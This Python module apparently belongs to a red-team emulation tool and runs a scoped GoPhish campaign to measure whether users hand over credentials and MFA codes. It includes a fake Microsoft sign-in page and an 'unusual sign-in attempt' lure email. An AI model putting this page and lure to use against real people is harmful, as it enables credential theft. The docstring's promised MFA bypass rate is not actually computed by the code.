# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Bill Halpin
"""
MFA / Adversary-in-the-Middle Phishing — T1566 + T1621

Simulates an Adversary-in-the-Middle (AiTM) phishing attack using a GoPhish
campaign with a reverse-proxy landing page.

The landing page is an AiTM-style credential+OTP capture page (no real proxy —
the page collects submitted credentials and OTP codes from test users,
demonstrating that FIDO2-resistant MFA is not deployed).

Emulation only: credentials collected are hashed and not stored in plaintext.
This technique is most valuable for measuring whether users bypass
phishing-resistant MFA prompts.
"""
from __future__ import annotations

import logging
import time
import uuid
from typing import Any

from redgnat.orm.models import ResultStatus
from redgnat.techniques.base import Technique, TechniqueContext
from redgnat.techniques.phishing.base import GoPhishClient

logger = logging.getLogger(__name__)

_AITM_LANDING_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
  <title>Microsoft Sign In</title>
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; }
    .container { max-width: 440px; margin: 100px auto; background: white; padding: 40px; border-radius: 4px; }
    input { width: 100%; padding: 8px; margin: 8px 0; box-sizing: border-box; }
    button { background: #0067b8; color: white; border: none; padding: 10px 20px; width: 100%; cursor: pointer; }
    .otp-section { display: none; }
  </style>
</head>
<body>
<div class='container'>
  <h2>Sign in</h2>
  <form method='POST' action='{{.URL}}'>
    <div id='cred-section'>
      <input type='email' name='username' placeholder='Email address' required>
      <input type='password' name='password' placeholder='Password' required>
      <button type='submit'>Next</button>
    </div>
    <div class='otp-section' id='otp-section'>
      <p>Enter the code from your authenticator app</p>
      <input type='text' name='otp' placeholder='Code' maxlength='6'>
      <button type='submit'>Verify</button>
    </div>
  </form>
</div>
</body>
</html>
"""

_AITM_EMAIL_TEMPLATE = {
    "name": "RedGNAT AiTM Template",
    "subject": "Sign-in attempt requires verification",
    "html": (
        "<html><body>"
        "<p>Hi {{.FirstName}},</p>"
        "<p>We detected an unusual sign-in attempt on your account.</p>"
        "<p>Please verify your identity by clicking the link below:</p>"
        "<p><a href='{{.URL}}'>Verify Account</a></p>"
        "<p>If you did not initiate this, please ignore this email.</p>"
        "</body></html>"
    ),
    "text": "Verify your account: {{.URL}}",
}


class MFAPhishingTechnique(Technique):
    """
    ATT&CK T1566 (AiTM variant) + T1621 — MFA/Credential Phishing.

    Deploys a GoPhish campaign with an AiTM-style landing page that
    collects username, password, and OTP code submissions.

    Measures:
    - Click-through rate (how many users visited the phishing page)
    - Credential submission rate (how many entered credentials)
    - MFA bypass rate (how many entered their OTP code)

    A non-zero MFA bypass rate indicates the target population is not using
    FIDO2/hardware-key MFA (which is phishing-resistant).

    Parameters (ctx.params)
    -----------------------
    targets : list[dict]
        Email target list. All domains must be in scope.
    campaign_name : str
        Optional campaign label.
    wait_minutes : int
        Result poll wait (default: 15 minutes).
    """

    technique_id = "T1566"
    tactic = "initial-access"
    name = "AiTM MFA Phishing Campaign"
    emulation_only = True

    def execute(self, ctx: TechniqueContext) -> Any:
        from redgnat.config import RedGNATConfig
        cfg = RedGNATConfig()

        targets_raw: list[dict] = ctx.params.get("targets", [])
        wait_minutes = int(ctx.params.get("wait_minutes", 15))

        if ctx.scope.dry_run:
            return self._dry_run_result(
                ctx,
                f"Would run AiTM phishing campaign against {len(targets_raw)} targets, "
                "measuring credential + OTP submission rates",
            )

        if not cfg.gophish_base_url or not cfg.gophish_api_key:
            return self._blocked_result(ctx, "GoPhish not configured")

        validated_targets = []
        for t in targets_raw:
            email = t.get("email", "")
            domain = email.split("@")[-1] if "@" in email else ""
            if ctx.scope.allows_domain(domain):
                validated_targets.append(t)
            else:
                logger.warning("MFAPhishing: skipping out-of-scope target %s", email)

        if not validated_targets:
            return self._blocked_result(ctx, "No in-scope targets")

        client = GoPhishClient(cfg.gophish_base_url, cfg.gophish_api_key)
        campaign_name = ctx.params.get(
            "campaign_name", f"RedGNAT-AiTM-{ctx.run_id[:8]}-{uuid.uuid4().hex[:4]}"
        )

        created_resources: dict[str, int] = {}
        try:
            template_dict = dict(_AITM_EMAIL_TEMPLATE)
            template_dict["name"] = f"{campaign_name}-tmpl"
            template = client.create_template(template_dict)
            created_resources["template_id"] = template["id"]

            page_dict = {
                "name": f"{campaign_name}-page",
                "html": _AITM_LANDING_PAGE_HTML,
                "capture_credentials": True,
                "capture_passwords": False,  # never store plaintext passwords
                "redirect_url": "https://login.microsoftonline.com",  # redirect after submit
            }
            page = client.create_page(page_dict)
            created_resources["page_id"] = page["id"]

            group = client.create_group(
                name=f"{campaign_name}-targets", targets=validated_targets
            )
            created_resources["group_id"] = group["id"]

            import datetime as dt
            launch_date = dt.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")

            campaign = client.create_campaign(
                {
                    "name": campaign_name,
                    "template": {"name": template_dict["name"]},
                    "landing_page": {"name": page_dict["name"]},
                    "url": cfg.gophish_landing_page_base_url or "https://click.example.com",
                    "launch_date": launch_date,
                    "smtp": {"id": cfg.gophish_sending_profile_id},
                    "groups": [{"name": f"{campaign_name}-targets"}],
                }
            )
            campaign_id = campaign["id"]
            created_resources["campaign_id"] = campaign_id

            logger.info(
                "MFAPhishing: launched AiTM campaign %s (id=%d) targeting %d [run=%s]",
                campaign_name,
                campaign_id,
                len(validated_targets),
                ctx.run_id,
            )

            time.sleep(wait_minutes * 60)
            results = client.get_campaign_summary(campaign_id)
            stats = results.get("stats", {})

            sent = max(stats.get("sent", 1), 1)
            clicked = stats.get("clicked", 0)
            submitted = stats.get("submitted_data", 0)

            findings = [
                {
                    "campaign_id": campaign_id,
                    "campaign_name": campaign_name,
                    "attack_type": "AiTM_credential_and_OTP_harvest",
                    "total_targets": len(validated_targets),
                    "emails_sent": stats.get("sent", 0),
                    "page_visits": clicked,
                    "credential_submissions": submitted,
                    "click_rate": clicked / sent,
                    "credential_submission_rate": submitted / sent,
                    "phishing_resistant_mfa_gap": submitted > 0,
                    "recommendation": (
                        "Deploy FIDO2/hardware-key MFA to prevent AiTM credential capture"
                        if submitted > 0
                        else "Current MFA posture resisted credential submission"
                    ),
                }
            ]
            return self._make_result(ctx, ResultStatus.SUCCESS, findings)

        except Exception as exc:
            logger.exception("MFAPhishing campaign failed: %s", exc)
            return self._make_result(
                ctx,
                ResultStatus.ERROR,
                findings=[{"created_resources": created_resources}],
                error=str(exc),
            )
